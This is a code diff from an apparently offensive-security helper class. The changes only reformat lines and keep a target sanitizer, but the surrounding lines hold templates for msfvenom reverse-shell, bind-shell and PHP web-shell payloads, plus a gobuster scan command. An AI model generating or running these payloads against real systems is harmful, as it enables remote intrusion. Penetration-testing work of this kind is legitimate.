@@ -23,6 +23,7 @@ class CommandGenerator:
     def _sanitize_target(target: str) -> str:
         """Sanitize target IP/hostname to prevent command injection."""
         import re as _re
+
         # H-3 FIX: Only allow valid IP addresses, hostnames, CIDR ranges
         if _re.match(r"^[a-zA-Z0-9._:/-]+$", target) and len(target) < 256:
             return target
@@ -126,9 +127,7 @@ class CommandGenerator:
 
         if extensions:
             # Sanitize extensions
-            safe_ext: str = (
-                extensions.replace("'", "").replace('"', "").replace(";", "")
-            )
+            safe_ext: str = extensions.replace("'", "").replace('"', "").replace(";", "")
             cmd += f" -x {safe_ext}"
 
         cmd += " -o gobuster_results.txt"
@@ -145,13 +144,9 @@ class CommandGenerator:
         if payload_type == "reverse_shell":
             return f"msfvenom -p linux/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o shell.elf"
         if payload_type == "bind_shell":
-            return (
-                f"msfvenom -p linux/x64/shell_bind_tcp LPORT={lport} -f elf -o bind.elf"
-            )
+            return f"msfvenom -p linux/x64/shell_bind_tcp LPORT={lport} -f elf -o bind.elf"
         if payload_type == "web_shell":
-            return (
-                f"msfvenom -p php/reverse_php LHOST={lhost} LPORT={lport} -o shell.php"
-            )
+            return f"msfvenom -p php/reverse_php LHOST={lhost} LPORT={lport} -o shell.php"
         return f"msfvenom -p {payload_type} LHOST={lhost} LPORT={lport} -f raw"
 
     def optimize_command(self, command: str) -> str:
